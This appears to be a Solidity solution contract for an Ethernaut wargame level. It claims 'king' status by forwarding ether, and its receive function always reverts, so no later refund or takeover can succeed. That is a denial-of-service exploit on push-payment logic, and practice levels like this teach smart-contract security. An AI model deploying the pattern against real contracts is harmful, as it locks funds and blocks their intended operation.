// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract EthernautLevl4 {
  function getKing(address payable kingAddress) payable public {
    kingAddress.transfer(msg.value);
  }

  receive() external payable {
    revert("nothing");
  }
}